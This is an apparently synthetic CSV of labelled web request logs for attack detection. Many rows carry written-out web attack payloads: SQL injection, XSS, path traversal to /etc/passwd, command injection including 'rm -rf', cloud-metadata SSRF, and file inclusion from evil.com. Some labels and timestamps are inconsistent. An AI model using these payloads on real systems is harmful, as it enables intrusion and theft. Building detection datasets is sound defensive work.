logged_at,client_ip,method,url,status_code,user_agent,is_attack,attack_type,logged_at.1,ua_family,referrer
2025-05-07T22:10:23+09:00,192.168.0.121,POST,/search?q=shoes,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T11:14:25+09:00,mobile_browser,https://www.facebook.com/
2025-05-06T15:22:04+09:00,21.232.49.46,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,504,python-requests/2.25.1,True,ssrf_rfi,2025-05-10T15:21:08+09:00,script,-
2025-05-14T08:29:14+09:00,181.69.120.72,BADTLS,\x16\x03\x01\x00\81\x01\x00…,400,-,True,tls_probe,2025-05-09T13:21:41+09:00,pentest_tool,-
2025-05-02T07:28:24+09:00,211.48.160.25,GET,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-14T06:46:11+09:00,browser,-
2025-05-14T00:06:07+09:00,10.0.0.242,POST,/admin/backup?file=config;echo+x,404,wget/1.8,True,command_injection,2025-05-05T13:04:42+09:00,script,-
2025-05-01T22:40:54+09:00,47.162.149.49,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,200,OWASP ZAP,True,tls_probe,2025-05-07T07:34:55+09:00,pentest_tool,-
2025-05-12T09:26:52+09:00,192.168.0.165,POST,/js/app.js?page=4,200,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-05T15:34:06+09:00,mobile_browser,https://twitter.com/
2025-05-09T22:06:58+09:00,192.168.0.26,POST,/api/v1/user/35,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-02T11:25:12+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-10T13:06:33+09:00,192.168.0.168,GET,/signup?page=3,302,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0,False,normal,2025-05-04T13:36:17+09:00,browser,https://www.facebook.com/
2025-05-04T00:14:08+09:00,10.0.0.56,POST,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,wpscan/3.8.23,True,xss,2025-05-05T11:19:49+09:00,pentest_tool,-
2025-05-01T15:28:35+09:00,14.116.247.231,GET,/contact,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-13T18:56:34+09:00,browser,https://example.com/
2025-05-12T13:35:42+09:00,192.168.0.226,POST,/products?page=1,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-01T12:15:45+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-09T03:17:22+09:00,33.167.28.94,GET,/images/../../../etc/passwd,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64),True,directory_traversal,2025-05-08T21:58:05+09:00,browser,-
2025-05-12T17:34:12+09:00,10.0.0.252,POST,/ping%253Fhost%253D8.8.8.8%253Bcat%252B/etc/passwd,500,Metasploit/6.4,True,command_injection,2025-05-02T23:45:58+09:00,pentest_tool,-
2025-05-07T21:44:01+09:00,10.0.0.73,GET,/ping?host=8.8.8.8;cat+/etc/passwd,404,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),True,command_injection,2025-05-02T14:15:00+09:00,crawler,https://example.com/prev
2025-05-12T17:49:20+09:00,192.168.0.255,POST,/login,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Edge/101.0,False,normal,2025-05-02T23:20:11+09:00,browser,https://example.com/prev
2025-05-10T13:41:27+09:00,10.0.0.84,GET,/comment%253Fmsg%253D%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,200,BurpSuite Community/2025.4,True,xss,2025-05-02T17:18:19+09:00,pentest_tool,-
2025-05-03T08:03:54+09:00,10.0.0.43,GET,/images/....//....//etc/passwd,200,curl/7.6,True,directory_traversal,2025-05-01T19:35:56+09:00,script,-
2025-05-14T20:43:41+09:00,10.0.0.142,GET,/proxy%3Furl%3Dhttp%3A//169.254.169.254/latest/meta-data/,403,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),True,ssrf_rfi,2025-05-02T16:47:11+09:00,crawler,-
2025-05-09T21:56:55+09:00,10.232.26.219,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-09T21:56:55+09:00,unknown,-
2025-05-03T08:37:44+09:00,10.0.0.212,POST,/images/....//....//etc/passwd,403,OWASP ZAP,True,directory_traversal,2025-05-06T17:36:28+09:00,pentest_tool,-
2025-05-01T19:15:42+09:00,227.234.188.192,GET,/profile?bio=<img src=x onerror=alert(1337)>,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,xss,2025-05-11T15:23:31+09:00,browser,-
2025-05-05T18:02:23+09:00,89.43.231.185,GET,/login.php?username=admin' OR '1'='1'--,200,Mozilla/5.0,True,sql_injection,2025-05-11T06:14:16+09:00,browser,-
2025-05-12T21:05:54+09:00,10.0.0.246,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Edge/102.0,True,ssrf_rfi,2025-05-05T21:47:30+09:00,browser,-
2025-05-09T15:03:16+09:00,192.168.0.149,POST,/about,200,"Mozilla/5.0 (Linux; Android 13; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Mobile Safari/537.36",False,normal,2025-05-03T06:26:18+09:00,mobile_browser,https://example.com/prev
2025-05-07T16:19:57+09:00,192.168.0.220,GET,/products?page=3,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0,False,normal,2025-05-06T18:07:08+09:00,browser,https://www.facebook.com/
2025-05-12T13:16:51+09:00,214.194.35.87,GET,/,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-10T08:04:35+09:00,browser,https://example.com/
2025-05-12T17:18:44+09:00,10.0.0.95,POST,/images/....//....//etc/passwd,403,wget/1.2,True,directory_traversal,2025-05-03T15:59:59+09:00,script,-
2025-05-08T09:43:52+09:00,10.0.0.73,BADTLS,/js/app.js?page=3,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-01T13:01:10+09:00,crawler,-
2025-05-02T21:15:26+09:00,172.16.0.251,POST,/css/style.css,200,wget/1.2,False,normal,2025-05-05T12:55:36+09:00,script,https://google.com/search?q=example
2025-05-09T16:30:26+09:00,192.168.0.229,GET,/about,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T16:53:15+09:00,mobile_browser,https://www.facebook.com/
2025-05-02T15:44:48+09:00,10.0.0.14,POST,/proxy%253Furl%253Dhttp%253A//169.254.169.254/latest/meta-data/,403,BurpSuite Community/2025.4,True,ssrf_rfi,2025-05-04T10:08:46+09:00,pentest_tool,-
2025-05-14T21:31:54+09:00,10.0.0.101,GET,/../../../../etc/passwd,404,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",True,directory_traversal,2025-05-01T15:33:42+09:00,browser,-
2025-05-03T08:58:46+09:00,192.168.0.177,GET,/about,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-05T17:58:50+09:00,mobile_browser,https://www.facebook.com/
2025-05-10T00:13:03+09:00,106.80.46.29,POST,/ping?host=8.8.8.8;rm+-rf+/tmp/*,500,curl/7.68.0,True,command_injection,2025-05-05T15:41:55+09:00,script,-
2025-05-03T09:13:06+09:00,10.0.0.53,GET,/../../../../etc/passwd,500,wget/1.5,True,directory_traversal,2025-05-02T23:05:14+09:00,script,-
2025-05-07T04:13:13+09:00,56.2.42.140,GET,/static/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-12T05:10:58+09:00,browser,-
2025-05-10T22:20:51+09:00,192.168.0.12,POST,/?page=3,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0,False,normal,2025-05-05T18:56:43+09:00,browser,https://bing.com/search?q=foo
2025-05-08T04:25:37+09:00,111.63.122.232,BADTLS,\x16\x03\x01\x00\87\x01\x00…,400,-,True,tls_probe,2025-05-06T13:16:12+09:00,pentest_tool,-
2025-05-14T01:31:28+09:00,10.70.131.224,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,500,-,True,tls_probe,2025-05-14T01:31:28+09:00,unknown,-
2025-05-06T12:18:03+09:00,240.217.232.71,GET,"/search?q=1' UNION SELECT username, password FROM users --",200,Mozilla/5.0,True,sql_injection,2025-05-06T23:15:42+09:00,browser,-
2025-05-06T12:53:00+09:00,10.0.0.205,BADTLS,/products,304,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-01T06:59:44+09:00,mobile_browser,https://www.facebook.com/
2025-05-12T12:16:26+09:00,192.168.0.193,POST,/home,200,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-01T12:00:54+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-11T08:00:14+09:00,192.168.0.77,GET,/css/style.css,200,wget/1.6,False,normal,2025-05-06T13:53:11+09:00,script,https://google.com/search?q=example
2025-05-04T16:36:26+09:00,172.16.0.136,GET,/signup,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",False,normal,2025-05-07T23:26:40+09:00,browser,https://twitter.com/
2025-05-05T08:08:51+09:00,10.0.0.167,GET,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,500,Metasploit/6.4,True,sql_injection,2025-05-05T11:38:07+09:00,pentest_tool,-
2025-05-10T17:30:17+09:00,192.168.0.194,POST,/products,200,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-06T14:14:50+09:00,mobile_browser,https://google.com/search?q=example
2025-05-01T01:54:15+09:00,192.168.0.154,GET,/signup?page=5,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0,False,normal,2025-05-01T08:10:12+09:00,browser,https://www.facebook.com/
2025-05-14T07:46:47+09:00,10.0.0.127,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,Metasploit/6.4,True,sql_injection,2025-05-03T14:05:00+09:00,pentest_tool,-
2025-05-02T20:54:25+09:00,192.168.0.177,POST,/js/app.js,200,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-06T12:26:21+09:00,mobile_browser,https://example.com/prev
2025-05-12T16:34:29+09:00,192.168.0.131,GET,/about?page=3,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-02T13:45:05+09:00,browser,https://google.com/search?q=example
2025-05-04T21:09:48+09:00,141.2.218.28,GET,/ping?host=8.8.8.8;rm+-rf+/tmp/*,500,python-requests/2.25.1,True,command_injection,2025-05-14T13:11:01+09:00,script,-
2025-05-06T21:43:48+09:00,192.168.0.64,GET,/home,200,python-requests/2.00,False,normal,2025-05-02T11:17:15+09:00,script,https://twitter.com/
2025-05-06T12:27:17+09:00,192.168.0.191,POST,/signup?page=3,302,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-02T12:58:11+09:00,mobile_browser,-
2025-05-10T17:44:22+09:00,10.0.0.252,POST,/../../../../etc/passwd,404,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),True,directory_traversal,2025-05-02T17:39:01+09:00,crawler,-
2025-05-01T01:33:03+09:00,192.168.0.64,GET,/products/4.html,302,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-02T17:23:08+09:00,crawler,-
2025-05-03T16:18:49+09:00,10.0.0.49,GET,/ping?host=8.8.8.8;cat+/etc/passwd,200,wpscan/3.8.23,True,command_injection,2025-05-02T14:35:26+09:00,pentest_tool,-
2025-05-01T17:49:59+09:00,105.219.51.190,BADTLS,%255Cx16%255Cx03%255Cx01%255Cx00%255Cx82%255Cx01%255Cx00...,200,python-requests/2.05,True,tls_probe,2025-05-06T09:20:15+09:00,script,-
2025-05-10T17:59:39+09:00,192.168.0.161,GET,/about,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",False,normal,2025-05-01T10:53:18+09:00,browser,https://google.com/search?q=example
2025-05-07T20:58:54+09:00,192.168.0.224,POST,/,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-02T13:00:37+09:00,mobile_browser,-
2025-05-13T07:35:42+09:00,192.168.0.113,POST,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0,False,normal,2025-05-07T19:06:22+09:00,browser,https://www.facebook.com/
2025-05-06T01:53:38+09:00,192.168.0.47,POST,/products/4.html,200,"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0 Mobile Safari/537.36",False,normal,2025-05-07T06:34:00+09:00,mobile_browser,https://twitter.com/
2025-05-11T21:59:46+09:00,47.46.198.170,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,True,tls_probe,2025-05-03T17:08:00+09:00,browser,-
2025-05-06T09:46:19+09:00,192.168.0.77,POST,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0,False,normal,2025-05-05T17:07:35+09:00,browser,https://www.facebook.com/
2025-05-07T13:36:00+09:00,192.168.0.210,POST,/home,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-04T13:25:11+09:00,browser,https://google.com/search?q=example
2025-05-09T15:10:24+09:00,10.0.0.193,GET,/comment%3Fmsg%3D%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0,True,xss,2025-05-06T14:10:40+09:00,browser,-
2025-05-13T09:08:05+09:00,192.168.0.15,POST,/signup,302,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",False,normal,2025-05-03T23:58:30+09:00,browser,-
2025-05-13T00:10:57+09:00,107.229.52.34,GET,/product?id=5 OR 1=1;--,200,Mozilla/5.0,True,sql_injection,2025-05-14T22:50:51+09:00,browser,-
2025-05-03T03:31:28+09:00,151.93.234.73,GET,/images/../../../etc/passwd,403,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),True,directory_traversal,2025-05-09T06:12:58+09:00,browser,-
2025-05-05T22:21:00+09:00,192.168.0.195,POST,/login,302,Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots),False,normal,2025-05-02T09:52:41+09:00,crawler,https://bing.com/search?q=foo
2025-05-12T07:11:19+09:00,192.168.0.222,GET,/home,404,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0,False,normal,2025-05-05T19:37:41+09:00,browser,https://example.com/prev
2025-05-07T13:10:54+09:00,10.0.0.161,POST,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",True,sql_injection,2025-05-05T09:44:37+09:00,browser,-
2025-05-12T17:28:52+09:00,10.0.0.58,POST,/search?q=<script>alert('x')</script>,403,Nessus v10.5,True,xss,2025-05-02T17:24:34+09:00,pentest_tool,-
2025-05-07T07:30:09+09:00,10.0.0.201,POST,/search?q=<script>alert('x')</script>,500,sqlmap/1.7#stable,True,sql_injection,2025-05-01T10:12:17+09:00,pentest_tool,https://twitter.com/
2025-05-04T11:28:14+09:00,115.159.174.57,GET,/static/js/app.js,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-14T07:47:54+09:00,browser,-
2025-05-12T21:45:50+09:00,10.0.0.7,POST,/images/....//....//etc/passwd,404,Baiduspider/2.0 (+http://www.baidu.com/search/spider.html),True,directory_traversal,2025-05-07T12:08:19+09:00,crawler,-
2025-05-05T21:10:29+09:00,192.168.0.135,POST,/products,200,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),False,normal,2025-05-06T23:24:19+09:00,crawler,-
2025-05-07T05:17:50+09:00,15.18.17.56,GET,/contact,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-13T14:12:13+09:00,browser,-
2025-05-12T08:08:57+09:00,192.168.0.222,POST,/search?q=shoes,200,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Mobile/15E148 Safari/604.1",False,normal,2025-05-06T12:24:09+09:00,mobile_browser,https://google.com/search?q=example
2025-05-02T15:01:36+09:00,192.168.0.251,GET,/js/app.js,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Edge/108.0,False,normal,2025-05-03T13:04:16+09:00,browser,https://example.com/prev
2025-05-05T20:35:26+09:00,192.168.0.148,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0,False,normal,2025-05-04T08:35:09+09:00,browser,https://bing.com/search?q=foo
2025-05-01T17:23:23+09:00,167.201.196.158,GET,/home,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-01T01:22:26+09:00,browser,https://example.com/
2025-05-10T01:14:02+09:00,192.168.0.210,GET,/search?q=shoes,500,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-06T21:24:55+09:00,mobile_browser,https://www.facebook.com/
2025-05-02T22:53:45+09:00,192.168.0.76,POST,/proxy?url=http://169.254.169.254/latest/meta-data/,500,Nikto/2.1.6 (Evasions:none),True,ssrf_rfi,2025-05-03T15:30:03+09:00,pentest_tool,https://bing.com/search?q=foo
2025-05-08T17:22:10+09:00,10.142.88.65,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-08T17:22:10+09:00,unknown,-
2025-05-04T08:20:06+09:00,10.0.0.12,GET,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,403,python-requests/2.45,True,xss,2025-05-06T11:45:17+09:00,script,-
2025-05-07T15:29:31+09:00,10.176.206.0,UNKNOWN,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-07T15:29:31+09:00,unknown,-
2025-05-05T22:00:31+09:00,223.216.176.156,BADTLS,\x16\x03\x01\x00\ce\x01\x00…,400,-,True,tls_probe,2025-05-09T12:39:15+09:00,pentest_tool,-
2025-05-13T10:20:11+09:00,108.205.248.55,BADTLS,\x16\x03\x01\x00\f0\x01\x00…,400,-,True,tls_probe,2025-05-01T15:19:28+09:00,pentest_tool,-
2025-05-14T06:29:16+09:00,224.77.155.74,GET,/home,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-05T08:25:22+09:00,browser,-
2025-05-01T13:48:22+09:00,42.141.36.192,GET,/static/js/app.js,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-07T14:21:14+09:00,browser,-
2025-05-14T12:53:07+09:00,192.168.0.120,POST,/api/v1/user/35,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Edge/107.0,False,normal,2025-05-05T10:47:16+09:00,browser,-
2025-05-12T12:47:36+09:00,192.168.0.1,GET,/login,200,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",False,normal,2025-05-04T17:00:26+09:00,browser,https://example.com/prev
2025-05-03T00:18:05+09:00,192.168.0.171,GET,/products,200,"Mozilla/5.0 (Linux; Android 9; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Mobile Safari/537.36",False,normal,2025-05-02T15:03:41+09:00,mobile_browser,https://bing.com/search?q=foo
2025-05-13T15:05:53+09:00,19.63.123.249,POST,/,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-10T09:08:04+09:00,browser,-
2025-05-11T09:26:39+09:00,243.180.90.56,POST,/about,200,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,normal,2025-05-06T15:58:35+09:00,browser,https://example.com/
2025-05-01T19:07:14+09:00,140.2.103.126,GET,/proxy?url=http://169.254.169.254/latest/meta-data/,502,Nikto/2.5.0,True,ssrf_rfi,2025-05-13T16:30:02+09:00,script,-
2025-05-08T16:54:17+09:00,192.168.0.15,GET,/signup,302,"Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Mobile Safari/537.36",False,normal,2025-05-02T23:31:58+09:00,mobile_browser,https://google.com/search?q=example
2025-05-09T00:08:11+09:00,10.0.0.239,GET,/images/....//....//etc/passwd,200,OWASP ZAP,True,directory_traversal,2025-05-07T20:38:51+09:00,pentest_tool,-
2025-05-04T17:18:51+09:00,10.0.0.18,POST,/product?id=10;DROP TABLE users,500,BurpSuite Community/2025.4,True,sql_injection,2025-05-03T10:40:15+09:00,pentest_tool,-
2025-05-03T16:54:45+09:00,10.0.0.25,POST,/load%253Ffile%253Dhttp%253A//evil.com/shell.txt,403,Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm),True,ssrf_rfi,2025-05-04T08:37:08+09:00,crawler,-
2025-05-09T22:07:01+09:00,10.23.17.66,BADTLS,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-09T22:07:01+09:00,unknown,-
2025-05-14T07:11:52+09:00,242.136.77.102,POST,/static/js/app.js,200,Mozilla/5.0 (X11; Linux x86_64),False,normal,2025-05-08T03:36:25+09:00,browser,https://example.com/
2025-05-08T12:04:03+09:00,10.0.0.126,GET,/search?q=%3Cscript%3Ealert%28%27x%27%29%3C/script%3E,200,Nikto/2.1.6 (Evasions:none),True,xss,2025-05-05T11:23:41+09:00,pentest_tool,https://example.com/prev
2025-05-11T17:51:01+09:00,10.0.0.190,POST,/proxy%3Furl%3Dhttp%3A//169.254.169.254/latest/meta-data/,200,wpscan/3.8.23,True,ssrf_rfi,2025-05-03T06:23:54+09:00,pentest_tool,https://google.com/search?q=example
2025-05-07T22:19:28+09:00,210.116.155.107,BADTLS,\x16\x03\x01\x00\x82\x01\x00...,403,sqlmap/1.7#stable,True,tls_probe,2025-05-07T22:04:54+09:00,pentest_tool,https://google.com/search?q=example
2025-05-14T01:24:26+09:00,192.168.0.90,GET,/,302,"Mozilla/5.0 (Linux; Android 10; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Mobile Safari/537.36",False,normal,2025-05-07T14:40:47+09:00,mobile_browser,https://google.com/search?q=example
2025-05-03T15:28:32+09:00,10.0.0.1,POST,/load%3Ffile%3Dhttp%3A//evil.com/shell.txt,403,python-requests/2.40,True,ssrf_rfi,2025-05-04T10:36:19+09:00,script,https://twitter.com/
2025-05-12T12:03:33+09:00,10.49.92.68,PRI,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA2\xE8U9\xBB...,400,-,True,tls_probe,2025-05-12T12:03:33+09:00,unknown,-
2025-05-14T06:27:37+09:00,114.107.10.121,GET,/contact,200,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),False,normal,2025-05-08T01:01:38+09:00,browser,-
2025-05-13T01:35:26+09:00,10.0.0.144,GET,/search?q=%253Cscript%253Ealert%2528%2527x%2527%2529%253C/script%253E,200,wpscan/3.8.23,True,sql_injection,2025-05-01T08:42:43+09:00,pentest_tool,https://bing.com/search?q=foo
